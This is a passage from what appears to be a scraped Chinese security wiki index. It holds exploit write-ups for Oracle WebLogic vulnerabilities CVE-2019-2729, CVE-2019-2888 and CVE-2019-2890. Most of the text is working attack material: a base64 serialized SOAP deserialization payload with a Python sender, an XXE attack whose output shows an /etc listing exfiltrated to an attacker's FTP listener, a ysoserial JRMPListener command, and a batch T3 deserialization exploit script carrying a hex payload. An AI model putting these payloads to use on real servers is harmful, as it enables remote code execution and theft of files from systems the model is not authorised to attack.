Pjx2b2lkIGluZGV4PSIyODU0Ij48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ0ODEiPjxieXRlPjc2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTQ5MSI+PGJ5dGU+NTI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMzU0Ij48Ynl0ZT4xMDA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNTkyIj48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ2NjYiPjxieXRlPjg4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjE3MyI+PGJ5dGU+MTE4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTM5NyI+PGJ5dGU+MTA1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjg4Ij48Ynl0ZT4xMTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNCI+PGJ5dGU+MTE2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjA1MSI+PGJ5dGU+ODg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MjQzIj48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU0MzkiPjxieXRlPjgwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjA3NiI+PGJ5dGU+MTA1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzk2OCI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNTkxIj48Ynl0ZT44ODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ4MDQiPjxieXRlPjkxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzM0MyI+PGJ5dGU+NzI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMzEiPjxieXRlPjExODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUwMjEiPjxieXRlPjExNDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjEzOTIiPjxieXRlPjEwMzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQyOTgiPjxieXRlPjExMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY0MzEiPjxieXRlPjI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1MDExIj48Ynl0ZT4xMDE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMjE5Ij48Ynl0ZT4xMTQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NjEzIj48Ynl0ZT4xMTY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxODAwIj48Ynl0ZT4xPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjE1NSI+PGJ5dGU+MTA4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iODkiPjxieXRlPjI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MzcwIj48Ynl0ZT40NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU1NzYiPjxieXRlPjE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1NDUwIj48Ynl0ZT41MzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM5NTMiPjxieXRlPjgxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTM5OSI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzU1NSI+PGJ5dGU+Njc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI5ODEiPjxieXRlPjExNTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ5MjIiPjxieXRlPjEwNTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE3NzQiPjxieXRlPjc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2Mjc2Ij48Ynl0ZT4yMDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjYwOTIiPjxieXRlPjEwMDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI0NTYiPjxieXRlPjExOTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI5NTMiPjxieXRlPjgyPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDk3NSI+PGJ5dGU+MTA4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTY2OCI+PGJ5dGU+MTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjEyNjEiPjxieXRlPjEwMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE3NTEiPjxieXRlPjExNDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjgxOCI+PGJ5dGU+MTExPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTE3NiI+PGJ5dGU+NTk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzODQ3Ij48Ynl0ZT42NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE5NiI+PGJ5dGU+OTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzOTMxIj48Ynl0ZT43MTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE2NzciPjxieXRlPjExNDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ4MzYiPjxieXRlPjk4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzc3NyI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMTMzIj48Ynl0ZT4xMDY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1ODAwIj48Ynl0ZT40NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI2MjciPjxieXRlPjEyMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM3NjIiPjxieXRlPjg1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzUzIj48Ynl0ZT4xMTY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMDMzIj48Ynl0ZT4xMTg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NjY4Ij48Ynl0ZT44NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE5NCI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjczNSI+PGJ5dGU+NzI8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxOTkyIj48Ynl0ZT4xMTE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxOTg2Ij48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM2NiI+PGJ5dGU+NDc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NDI5Ij48Ynl0ZT4xPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTE1MCI+PGJ5dGU+MTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MDg0Ij48Ynl0ZT45OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU4MjIiPjxieXRlPjg5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjA4Ij48Ynl0ZT45ODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE1MjMiPjxieXRlPjEwMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQwOTQiPjxieXRlPjc2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjU5NyI+PGJ5dGU+NTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NDY3Ij48Ynl0ZT4xMDg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NTExIj48Ynl0ZT4xMDM8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1ODQ3Ij48Ynl0ZT4xODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE3NDEiPjxieXRlPjExNDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9Ijg0NyI+PGJ5dGU+MTA5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjEzOCI+PGJ5dGU+MTA1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iOTMzIj48Ynl0ZT4xMTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNDYyIj48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjEwODUiPjxieXRlPjExNDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUwNDQiPjxieXRlPjExNzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ5MTgiPjxieXRlPjEyPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTk2NCI+PGJ5dGU+MTAzPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzM4Ij48Ynl0ZT40NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9Ijg2MSI+PGJ5dGU+MTA0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTIwNSI+PGJ5dGU+Njg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NTUxIj48Ynl0ZT4xMDQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNzQ3Ij48Ynl0ZT43NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUxNDkiPjxieXRlPjExNzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMzMjEiPjxieXRlPjEwODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI3NTciPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzg2NiI+PGJ5dGU+Nzk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNjUyIj48Ynl0ZT42OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMxNzMiPjxieXRlPjQ5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDc3MyI+PGJ5dGU+MTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIyOTMiPjxieXRlPjExODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE0NTUiPjxieXRlPjExMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU2NTciPjxieXRlPjE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MDQ1Ij48Ynl0ZT4xPC9ieXRlPjwvdm9pZD48L2FycmF5Pjwvdm9pZD48L2FycmF5PjwvamF2YT48L3dvcms6V29ya0NvbnRleHQ+PC9zb2FwZW52OkhlYWRlcj48c29hcGVudjpCb2R5Lz48L3NvYXBlbnY6RW52ZWxvcGU+Cg==\" xml = base64.b64decode(yss_obj) payload = pref + xml.decode() requests.packages.urllib3.disable_warnings() requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += 'HIGH:!DH:!aNULL' try: requests.packages.urllib3.contrib.pyopenssl.DEFAULT_SSL_CIPHER_LIST += 'HIGH:!DH:!aNULL' except AttributeError: pass print(\"[+] Send Request to : \" + url) print(\"\\n\") res = requests.post(url, headers=headers, data=payload, timeout=10, verify=False) print(\"[+] Response : \" + res.text) 参考链接 https://github.com/ruthlezs/CVE-2019-2729-Exploit/blob/master/oracle-weblogic-deserialize.py Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:05 "},"Web安全/Weblogic/（CVE-2019-2888）Weblogic EJBTaglibDescriptor XXE漏洞/（CVE-2019-2888）Weblogic EJBTaglibDescriptor XXE漏洞.html":{"url":"Web安全/Weblogic/（CVE-2019-2888）Weblogic EJBTaglibDescriptor XXE漏洞/（CVE-2019-2888）Weblogic EJBTaglibDescriptor XXE漏洞.html","title":"（CVE-2019-2888）Weblogic EJBTaglibDescriptor XXE漏洞","keywords":"","body":"（CVE-2019-2888）Weblogic EJBTaglibDescriptor XXE漏洞 一、漏洞简介 二、漏洞影响 Weblogic Server 10.3.6.0.0版本、12.1.3.0.0版本和12.2.1.3.0版本的EJB Container组件存在安全漏洞 三、复现过程 fernflower.jar weblogic.jar/weblogic/servlet/ejb2jsp/dd/EJBTaglibDescriptor.class ╭─root@jas502n /var ╰─# find ./ |grep EJBTaglibDescriptor  ✔  8388  18:32:43 .//weblogic.jar/weblogic/servlet/ejb2jsp/dd/EJBTaglibDescriptor.class .//weblogic.jar/weblogic/servlet/ejb2jsp/gui/EJBTaglibDescriptorTree.class .//weblogic.jar/weblogic/servlet/ejb2jsp/gui/EJBTaglibDescriptorPanel.class ╭─root@jas502n /var ╰─# ls  ✔  8392  18:33:22 EJBTaglibDescriptor.java fernflower.jar weblogic.jar EJBTaglibDescriptor.class to EJBTaglibDescriptor.java ╭─root@jas502n /var ╰─# java -jar fernflower.jar .//weblogic.jar/weblogic/servlet/ejb2jsp/dd/EJBTaglibDescriptor.class ./ ./ INFO: Decompiling class weblogic/servlet/ejb2jsp/dd/EJBTaglibDescriptor INFO: ... done ╭─root@jas502n /var ╰─# ls EJBTaglibDescriptor.java fernflower.jar weblogic.jar cat EJBTaglibDescriptor.java ╭─root@jas502n /var ╰─# cat EJBTaglibDescriptor.java package weblogic.servlet.ejb2jsp.dd; import java.io.Externalizable; import java.io.File; import java.io.FileInputStream; import java.io.IOException; import java.io.InputStreamReader; import java.io.ObjectInput; import java.io.ObjectOutput; import java.io.Reader; import java.io.StringReader; import java.io.StringWriter; import java.util.ArrayList; import java.util.Collection; import java.util.Enumeration; import java.util.Iterator; import java.util.List; import javax.xml.parsers.DocumentBuilder; import org.w3c.dom.Element; import org.xml.sax.InputSource; import weblogic.servlet.ejb2jsp.BeanGenerator; import weblogic.servlet.ejb2jsp.EJBMethodGenerator; import weblogic.servlet.ejb2jsp.EJBTaglibGenerator; import weblogic.servlet.ejb2jsp.HomeCollectionGenerator; import weblogic.servlet.ejb2jsp.HomeFinderGenerator; import weblogic.servlet.ejb2jsp.HomeMethodGenerator; import weblogic.servlet.internal.dd.ToXML; import weblogic.utils.Getopt2; import weblogic.utils.classloaders.ClasspathClassLoader; import weblogic.utils.io.XMLWriter; import weblogic.xml.dom.DOMProcessingException; import weblogic.xml.dom.DOMUtils; import weblogic.xml.jaxp.WebLogicDocumentBuilderFactory; public class EJBTaglibDescriptor implements ToXML, Externalizable { private static final long serialVersionUID = -9016538269900747655L; private FilesystemInfoDescriptor fileInfo; private BeanDescriptor[] beans; private transient ClassLoader jarLoader; private static final String PREAMBLE = \"\\n\"; static void p(String var0) { System.err.println(\"[EJBTagDesc]: \" + var0); } 漏洞利用 下载python xxer https://github.com/ianxtianxt/CVE-2019-2888 info: Starting xxer_httpd on port 8989 info: Starting xxer_ftpd on port 2121 http://10.10.20.100:8989/ext.dtd python xxer.py -p 8989 -H 10.10.20.100 _ _ _ _ ___ ___ |_'_|_'_| -_| _| |_,_|_,_|___|_| version 1.1 info: Old DTD found. This file is going to be deleted. info: Generating new DTD file. info: Starting xxer_httpd on port 8989 info: Starting xxer_ftpd on port 2121 info: Servers started. Use the following payload (with URL-encoding): %aaa;%ccc;%ddd;]> 通过T3协议，发送序列化后的xml payload ale@Pentest: ~/Desktop/CVE-2019-2888# python weblogic.py 10.10.20.100 7001 _ __ __ __ _ _ ___ __ ______ | | / /__ / /_ / /___ ____ _(_)____ | |/ / |/ // ____/ | | /| / / _ \\/ __ \\/ / __ \\/ __ `/ / ___/ | /| // __/ | |/ |/ / __/ /_/ / / /_/ / /_/ / / /__ / |/ |/ /___ |__/|__/\\___/_.___/_/\\____/\\__, /_/\\___/ /_/|_/_/|_/_____/ /____/ CVE-2019-2888 WebLogic EJBTaglibDescriptor XXE漏洞 python By jas502n [+] XXE_IP= 10.10.20.166 [+] XXE_IP= 8989 [+] http://10.10.20.166:8989/ext.dtd connecting to 10.10.20.100 port 7001 sending \"t3 12.2.1 AS:255 HL:19 MS:10000000 PU:t3://us-l-breens:7001 \" received \"HELO\" sending payload... ale@Pentest: ~/Desktop/CVE-2019-2888# get /etc dir info root@kali:~/xxer# python xxer.py -p 8989 -H 10.10.20.166 _ _ _ _ ___ ___ |_'_|_'_| -_| _| |_,_|_,_|___|_| version 1.1 info: Old DTD found. This file is going to be deleted. info: Generating new DTD file. info: Starting xxer_httpd on port 8989 info: Starting xxer_ftpd on port 2121 info: Servers started. Use the following payload (with URL-encoding): %aaa;%ccc;%ddd;]> 10.10.20.100 - - [01/Nov/2019 12:58:42] \"GET /ext.dtd HTTP/1.1\" 200 - info: FTP: recvd 'USER fakeuser' info: FTP: recvd 'PASS .pwd.lock adduser.conf alternatives apparmor apparmor.d apt bash_completion.d bash.bashrc bindresvport.blacklist blkid.conf blkid.tab ca-certificates ca-certificates.conf console-setup cron.d cron.daily cron.hourly cron.monthly cron.weekly crontab dbus-1 debconf.conf debian_version Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:09:05 "},"Web安全/Weblogic/（CVE-2019-2890）Weblogic反序列化漏洞/（CVE-2019-2890）Weblogic反序列化漏洞.html":{"url":"Web安全/Weblogic/（CVE-2019-2890）Weblogic反序列化漏洞/（CVE-2019-2890）Weblogic反序列化漏洞.html","title":"（CVE-2019-2890）Weblogic反序列化漏洞","keywords":"","body":"（CVE-2019-2890） Weblogic T3 Analysis 一、漏洞简介 二、漏洞影响 WebLogic Server 10.3.6.0 WebLogic Server 12.1.3.0 WebLogic Server 12.2.1.3 三、复现过程 https://github.com/ianxtianxt/CVE-2019-2890 1.导入jar 网上有两篇文章都说了这么个构造思路，但是我阅读学习的时候，死在了导入jar这个难题下，因此在漏洞利用的开头，我列出几个jar文件，测试环境 weblogic 10.3.6 ，可能weblogic 12 jar名字有所不同。 com.bea.core.logging_1.9.0.0.jar com.bea.core.management.core_2.9.0.1.jar com.oracle.core.weblogic.msgcat_1.2.0.0.jar cryptoj.jar glassfish.jaxb_1.1.0.0_2-1-14.jar weblogic.jar wlthint3client.jar Weblogic反序列化漏洞/media/rId26.png) 2.重写PersistenContext类 因为需要用到 PersinstenContext 这个类，因此序列化的时候肯定要将其实例化，但是在下图代码位置有个if检查。 Weblogic反序列化漏洞/media/rId28.png) 在这个if检查的结果会抛出 com.bea.core.security.managers.NotSupportedException 的异常导致反序列化中止。 Weblogic反序列化漏洞/media/rId29.png) 因此这里解决办法就是绕过它，把它注释掉。 Weblogic反序列化漏洞/media/rId30.png) 3.改造writeSubject中的writeObject 原先在 writeSubject 中正常写入的对象如下图所示。 Weblogic反序列化漏洞/media/rId32.png) 这里我们需要将其替换掉，改成我们自己恶意对象，我的做法是构造恶意的JRMP对象。 Weblogic反序列化漏洞/media/rId33.png) int sep = command.indexOf(58); String host; int port; if (sep 4.改造加密问题 原先我们看到了，反序列化过程中有个解密过程，所以这里需要加密一下。首先加密过程有个KernelStatus.isServer()的判断。 if (KernelStatus.isServer()) { var5 = EncryptionUtil.encrypt(var5); } 会说我直接改造一下，把if去掉，让他直接EncryptionUtil.encrypt不就好了吗，但是跟进去之后会发现还是有个 Kernel.isServer() 的的判断。 public static byte[] encrypt(byte[] var0) { return Kernel.isServer() ? getEncryptionService().encryptBytes(var0) : var0; } 因此这里需要调用KernelStatus.setIsServer(true);，将状态设置为true。 Weblogic反序列化漏洞/media/rId35.png) 当然这里还有另一种解法，我们实际上可以直接调用 var5 = EncryptionUtil.getEncryptionService().encryptBytes((byte []) var5); 但是有个小问题 getEncryptionService 是一个 private 方法，你需要重写一个把它变成public就可以直接调用了。 Weblogic反序列化漏洞/media/rId36.png) 所以我重写了一个 EncryptionUtil ，并且将 getEncryptionService 设置为了 public 。 Weblogic反序列化漏洞/media/rId37.png) Weblogic反序列化漏洞/media/rId38.png) 5.解决加密key的问题 在 weblogic.security.internal.SerializedSystemIni 存在一个加密的key，这个key实际上每个weblogic都不一样，所以官方给这个漏洞评价为授权状态下getshell，也是和之前的T3反序列化不太一样的地方，这里的解决办法就是你要复现那个weblogic，就找到他的 SerializedSystemIni.dat 文件，并且在自己的目录下创建一个 security 目录，放进去就好了。 Weblogic反序列化漏洞/media/rId40.png) 6.最后一个小问题 在序列化的时候会出现卡死状态的，跟进之后发现原因在weblogic.security.subject.SubjectManager这个类里面。 Weblogic反序列化漏洞/media/rId42.png) 在这个类里面的 getSubjectManager 方法会有一个 ceClient 的判断，如果为fasle就不会直接返回 ceSubjectManager 对象，因此需要让他为 true 。 Weblogic反序列化漏洞/media/rId43.png) 而这个鬼东西默认情况下是false。 private static final boolean ceClient = \"true\".equalsIgnoreCase(System.getProperty(\"com.bea.core.internal.client\", \"false\")); 因此只需要System.setProperty(\\\"com.bea.core.internal.client\\\",\\\"true\\\");让他过去即可。 脚本使用说明 https://github.com/ianxtianxt/CVE-2019-2890 已经将相关jar文件都导入到了项目中，并且利用方式采用yso的JRMP，学习调试时候可以修改利用方式。 首先需要将weblogic下的 SerializedSystemIni.dat 文件放置到 security 文件夹下。 然后需要将yso重命名为 ysoserial.jar ，并且导入到 lib 目录下。 Weblogic反序列化漏洞/media/rId45.png) 其次 weblogic/wsee/jaxws/persistence/PersistentContext.java 中的 getObject 的IP地址和端口。 try { var3.writeObject(Poc.getObject(\"127.0.0.1:8000\")); } catch (Exception e) { e.printStackTrace(); } 最后远程通过JRMP监听，利用7u21命令执行。 java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8000 Jdk7u21 \"calc.exe\" 使用方法，运行Poc.java生成poc.ser序列化文件，通过 python weblogic.py ip port poc.ser Weblogic反序列化漏洞/media/rId46.png) Weblogic反序列化漏洞/media/rId47.png) 2020/2/9 再次补充 再添加一个批量脚本 #!/usr/bin/python # -*- coding: utf-8 -*- # 2019-10-17 8:45 import socket import time import re import sys timeout = int(sys.argv[1]) VUL=['CVE-2019-2890'] PAYLOAD=['aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078'] VER_SIG=['\\\\$Proxy[0-9]+'] vul_no = [] vul_yes = [] vul_more_test = [] def t3handshake(sock,server_addr): print '正在连接服务器...' sock.connect(server_addr) sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex')) time.sleep(1) sock.recv(1024) def buildT3RequestObject(sock,port,server_addr): print '%s:%d连接成功，正在发送请求...' %(server_addr[0],server_addr[1]) data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371' data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('{:04x}'.format(dport)) data3 = '1a7727000d3234322e323134' data4 = '2e312e32353461863d1d0000000078' for d in [data1,data2,data3,data4]: sock.send(d.decode('hex')) time.sleep(2) lendate = len(sock.recv(2048)) print '发送有效载荷请求成功,接收长度:%d'%(lendate) return lendate def sendEvilObjData(sock,data,lendate): print '正在执行载荷，请稍等...' payload='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000' payload+=data payload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff' payload = '%s%s'%('{:08x}'.format(len(payload)/2 + 4),payload) sock.send(payload.decode('hex')) time.sleep(2) sock.send(payload.decode('hex')) res = '' start = time.time() try: while True: res += sock.recv(4096) time.sleep(0.1) end =time.time() timeend = end-start if lendate == 0 and timeend > timeout: break except Exception as e: pass return res def checkVul(res,server_addr,index): print '执行结果：' p=re.findall(VER_SIG[index], res, re.S) if len(p)>0: print '%s:%d 存在 %s 漏洞。'%(server_addr[0],server_addr[1],VUL[index]) vul_yes.append(server_addr) else: print '%s:%d 不存在 %s 漏洞。' % (server_addr[0],server_addr[1],VUL[index]) print '[+] You look like Cai Xukun when you play basketball' vul_no.append(server_addr) def run(index): with open(\"url.txt\",'r') as lists: for server_addr in lists: server_addr=server_addr.strip('\\n\\r') dip=server_addr.split(':')[0] global dport dport=int(server_addr.split(':')[1]) sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(15) server_addr = (dip, dport) try: t3handshake(sock,server_addr) except Exception as e: print '%s:%d连接失败，请检查IP是否存活...' %(server_addr[0],server_addr[1]) else: try: lendate = buildT3RequestObject(sock,dport,server_addr) rs=sendEvilObjData(sock,PAYLOAD[index],lendate) # print 'rs',rs except Exception as e: print '%s:%d请求频繁，请稍后自行单独测试...' %(server_addr[0],server_addr[1]) vul_more_test.append(server_addr) else: checkVul(rs,server_addr,index) finally: sock.close() print '='*50 print '检测完成！' print '以下IP存在CVE-2019-2890漏洞：' for yes in vul_yes: print '%s:%s' % (yes[0],yes[1]) print '='*50 print '以下IP不存在漏洞：' for no in vul_no: print '%s:%s' % (no[0],no[1]) print '='*50 print '以下IP请求频繁，需单独自行测试：' for more in vul_more_test: print '%s:%s' % (more[0],more[1]) print '='*50 if __name__==\"__main__\": run(0) 四、参考链接 https://xz.aliyun.com/t/6904#toc-1 Qingy文库 all right reserved，powered by 